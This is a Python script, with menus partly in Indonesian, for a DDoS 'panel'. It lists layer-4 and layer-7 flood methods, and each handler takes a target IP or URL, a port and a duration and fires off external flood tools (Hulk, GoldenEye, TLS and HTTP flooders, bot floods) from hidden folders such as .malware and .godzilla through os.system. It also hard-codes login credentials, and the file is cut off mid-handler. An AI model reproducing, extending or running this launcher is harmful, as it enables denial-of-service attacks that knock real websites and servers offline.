print("""welcome to big bang panel tools berbayar gw ubah jadi grais
1.big bang panel v1
2.big bang panel v2
3.big bang panel v3
4.ddos biasa
5.ddos overpower
6.super DDoS
ingat password dan user name ini
username root
pw  28""")

pilih = input ("pilih mana : ")

if pilih == "3":
  print("ingat ingat password ini")
  print("username root")
  print("password 28")
  # -*- coding: utf-8 -*-
  from operator import index
  import socket
  import random
  import string
  import threading
  import getpass
  import urllib
  import getpass
  from colorama import Fore, Back
  import os,sys,time,re,requests,json
  from requests import post
  from time import sleep
  from datetime import datetime, date
  import codecs

  B = '\033[35m' #MERAH
  P = '\033[1;37m' #PUTIH

  def layer7():
    os.system ("clear")
    print("""
  \033[37m[ LAYER - 7 ]
  \033[35mNOTE USE:
  METHODE [URL] [PORT] [TIME]

  \033[37m – STRIKE   – TLSV3 
   – BOMB2    – JAVA
   – BOMB     – HTTP
   – GOLDEN   – MIX
   – UAM 
   – TLS 
   – TLSV2

  """)

  def layer12():
    os.system ("clear")
    print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 12 ]
  \033[35mUSE FOR BOT COUNT

  \033[37m– BRUTAL [url] [time]
  – BOT [url] [time]
  – BOT2 [url] [time]

  """)

  def VVIP():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BILL PANEL
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ VVIP ]
  \033[35mNOTE USE:
  METHODE [URL] [PORT] [TIME]

  \033[37m– HTTPS
  – HTTPS2
  – BYPASS
  – BROWSER
  – KILLNET

  """)

  def layer4():
    os.system ("clear")
    print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 4 ]
  \033[35mNOTE USE: 
  mode   [1/2/3]
  method [GET/POST/HEAD]


  \033[37m – STRESS [ip] [port] [mode] [time]
   – TCP [ip] [port] [time] [method]
   – OVH [ip] [port] [time] [method]


  """)    

  def help():
    os.system ("clear")
    print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ MENU BIGBANG-PANNEL ]
  HOW TO USE TYPE L7 OR L4 TO SEE COMMANDS

  [LAYER-7]       [LAYER-4]       [LAYER-12]      [VVIP]
  \033[35m• STRIKE        • STRESS        • BRUTAL        • HTTPS [\033[32mVVIP\033[35m]
  • BOMB2         • TCP           • BOT           • HTTPS2 [\033[32mVVIP\033[35m]
  • BOMB          • OVH           • BOT2 [\033[32mVIP\033[35m]    • BYPASS [\033[32mVVIP\033[35m]
  • GOLDEN                                        • BROWSER [\033[32mVVIP\033[35m]
  • UAM                                           • KILLNET [\033[32mVVIP\033[35m]
  • TLS [\033[32mVIP\033[35m]
  • TLSV2 [\033[32mVIP\033[35m]
  • TLSV3 [\033[32mVIP\033[35m]
  • JAVA
  • HTTP [\033[32mVIP\033[35m]
  • MIX [\033[32mVIP\033[35m]

  """)

  def menu():
      os.system ("clear")
      print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'


  \x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
  """)



  def main():

    while True:
      sys.stdout.write(f"\x1b]2;[/] BigBang Pannel :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
      sin = input("\033[0;30;45mBigBang@PANNEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
      sinput = sin.split(" ")[0]
      if sinput == "clear":
        os.system ("clear")
        menu()
      if sinput == "cls" or sinput == "CLS":
        os.system ("pkill screen")
        os.system ("clear")
        menu()
      if sinput == "stop" or sinput == "STOP":
        os.system ("pkill screen")
        menu()			
      if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
        layer12()
      if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
        VVIP()
      if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
        layer7()
      if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
        layer4()
      if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
        help()
      if sinput == "plan":
        plant()
      elif sinput == "":
        main()

  #########LAYER-4########
      elif sinput == "stress" or sinput == "STRESS":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          method = sin.split()[3]
          time = sin.split()[4]
          os.system(f'cd .resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mSTRESSER \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tcp" or sinput == "TCP":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          method = sin.split()[4]
          os.system(f'cd .resources && screen -dm ./TCP {method} {ip} {port} {time} 15000')
          os.system(f'cd .TC1 && screen -dm ./TCP {method} {ip} {port} {time} 7000')
          os.system(f'cd .TC2 && screen -dm ./TCP {method} {ip} {port} {time} 10000')
          os.system(f'cd .resources && screen -dm./RAW {method} {ip} {port} {time} 15000')
          os.system(f'cd .TC1 && screen -dm ./RAW {method} {ip} {port} {time} 7000')
          os.system(f'cd .TC2 && screen -dm ./RAW {method} {ip} {port} {time} 10000')
          os.system(f'cd /media && screen -dm ./RAW {method} {ip} {port} {time} 7000')
          os.system(f'cd /media && screen -dm ./TCP {method} {ip} {port} {time} 7000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mTCP \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "ovh" or sinput == "OVH":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          method = sin.split()[4]
          os.system(f'cd .resources && ./RAW {method} {ip} {port} {time} 15000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mOVH \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()

  #########LAYER-7########  
      elif sinput == "strike" or sinput == "STRIKE":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd /media && screen -dm go run strike.go -url {host} GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mSTRIKE \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "java" or sinput == "JAVA":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .randomstring && cd examples && java input2.java {host} 8000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mJAVA \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tls" or sinput == "TLS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 45 5 500')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[\033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLS \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bot" or sinput == "BOT":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
          os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
          os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "brutal" or sinput == "BRUTAL":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')				
          os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
          os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tlsv2" or sinput == "TLSV2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 32 5 500')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 32 1')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tlsv3" or sinput == "TLSV3":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')  
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "http" or sinput == "HTTP":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
          os.system(f'cd .malware && screen -dm node HTTP-RAND.js {host} {time}')
          os.system(f'cd .malware && screen -dm node HTTP.js {host} 300 8 {time}')
          os.system(f'cd /media && screen -dm node HTTP.js {host} 300 8 {time}')
          os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bomb2" or sinput == "BOMB2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bomb" or sinput == "BOMB":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run Low.go -site {host} -data GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "golden" or sinput == "GOLDEN":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && python3 goldeneye.py {host} -w 10 -s 500 -m random -d True')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET    : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
  \033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER      : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "https" or sinput == "HTTPS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 8 500')		
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 5 128')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 128')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')	
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "https2" or sinput == "HTTPS2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 500 2')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 500 5')
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 1 {time}')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data GET')
          os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
